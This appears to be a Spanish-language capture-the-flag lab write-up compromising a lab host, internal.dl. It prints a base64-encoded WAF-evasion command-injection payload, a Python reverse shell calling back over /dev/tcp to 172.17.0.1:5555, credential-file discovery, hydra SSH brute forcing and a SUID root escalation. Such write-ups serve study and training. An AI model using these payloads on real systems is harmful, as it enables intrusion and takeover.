
### Fase de Reconocimiento y Descubrimiento (Enumeración)

#### Escaneo de Puertos (Nmap)

Realizamos un escaneo de puertos inicial con nmap para identificar los servicios activos en la máquina objetivo:

![[Pasted image 20260805000332.png]]

**Servicios identificados:**

* **Puerto 22/TCP (SSH):** Servicio OpenSSH abierto para acceso remoto. Ver teoría en [SSH.md](<../../../Pentesting Notes/1_Enumeration/SSH.md>).
* **Puerto 80/TCP (HTTP):** Servidor web Apache corriendo en el host. Ver teoría en [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>).
* **Configuración de Dominio:** El escaneo reporta que el sitio web apunta al dominio `internal.dl`. Procedemos a añadirlo al archivo `/etc/hosts` de nuestra máquina atacante para permitir la resolución de nombres:

```
172.17.0.2  internal.dl
```

***

### Enumeración de Servicios y Web

#### Fuzzing de Subdominios (Virtual Hosts)

Tras realizar fuzzing de directorios tradicionales en `internal.dl` sin resultados relevantes, procedemos a realizar fuzzing de virtual hosts para descubrir subdominios activos:

![[Pasted image 20260805001854.png]]

* **Subdominio Descubierto:** Identificamos el subdominio `backup.internal.dl`. Lo agregamos a nuestro `/etc/hosts`:

```
172.17.0.2  backup.internal.dl
```

#### Inspección del Subdominio

Al acceder a `backup.internal.dl` a través del navegador, encontramos una interfaz web con una caja de entrada de comandos:

![[Pasted image 20260805001914.png]]

***

### Fase de Explotación / Intrusión

#### Evasión de WAF y Command Injection

Intentamos inyección de comandos utilizando operadores típicos como `;`, `&&`, `||`, `&` y `|`. Sin embargo, un WAF (Web Application Firewall) bloquea la mayoría de los caracteres y comandos comunes.

Durante las pruebas, detectamos que el caracter pipe `|` y la función `printf` no se encuentran bloqueados por los filtros. Del mismo modo, los comandos `base64` y `python3` están permitidos.

Construimos un payload codificado en base64 que importa el módulo `os` de Python para ejecutar comandos en el sistema. Probamos primero ejecutando `whoami`:

```
| printf "aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ3dob2FtaScp" | base64 -d | python3
```

![[Pasted image 20260805004426.png]]

* **Resultado:** La ejecución tiene éxito y nos devuelve el usuario `www-data`.

#### Reverse Shell

Para obtener una shell interactiva, generamos una reverse shell en Python codificada en base64:

```python
import os; os.system('bash -c "bash -i >& /dev/tcp/172.17.0.1/5555 0>&1"')
```

Codificada en base64:

```
aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2Jhc2ggLWMgXCJiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNTU1NSAwPiYxXCInKQ==
```

Enviamos la petición a través de Burp Suite con el payload codificado para URL:

```
|+printf+"aW1wb3J0IG9zOyBvcy5zeXN0ZW0oJ2Jhc2ggLWMgXCJiYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNTU1NSAwPiYxXCInKQ=="+|+base64+-d+|+python3
```

![[Pasted image 20260805004853.png]]

Recibimos la conexión en nuestra máquina atacante en el puerto 5555:

![[Pasted image 20260805004919.png]]

* **Estabilización de Shell (TTY):** Realizamos el tratamiento estándar de la terminal:

```bash
script /dev/null -c bash
# CTRL + Z
stty raw -echo; fg
reset xterm
export TERM=xterm && export SHELL=bash
```

***

### Escalada de Privilegios

#### Pivotaje al Usuario vault

Leemos el archivo `/etc/passwd` y localizamos al usuario `vault`:

![[Pasted image 20260805010809.png]]

Realizamos una búsqueda de archivos en el sistema relacionados con este usuario o que contengan su nombre:

![[Pasted image 20260805010855.png]]

* **Hallazgo:** Descubrimos el archivo `.vault_pass.txt` en el directorio de copias de seguridad de la web.
* **Fuerza Bruta SSH:** Utilizamos las palabras o la credencial del archivo para realizar fuerza bruta al servicio SSH mediante hydra con el usuario `vault`:

![[Pasted image 20260805010926.png]]

* **Resultado:** Obtenemos la contraseña correcta de SSH y nos conectamos al sistema:

```bash
ssh vault@172.17.0.2
```

![[Pasted image 20260805011027.png]]

#### Escalada a root (vaultctl)

Una vez iniciada la sesión como `vault`, buscamos binarios o permisos especiales. Identificamos un ejecutable personalizado en las rutas del sistema:

* **Vulnerabilidad de Configuración:** El binario `/usr/local/bin/vaultctl` posee el bit SUID configurado o permite su ejecución directa como root.
* **Explotación:** Ejecutamos el binario para obtener privilegios máximos:

```bash
/usr/local/bin/vaultctl
```

![[Pasted image 20260805011157.png]]

* **Resultado:** Obtenemos acceso completo como root.

***

### Relaciones y Conceptos

* **Teoría:** [HTTP & HTTPS.md](<../../../Pentesting Notes/1_Enumeration/HTTP & HTTPS.md>), [Linux Privilege Escalation - Permissions.md](<../../../Pentesting Notes/3_Post-Explotation/Linux Privilage Escalation/Permissions.md>)
* **Laboratorios Relacionados:** [Internship](Internship.md) (Comparte fuzzing de subdominios / vhosts)
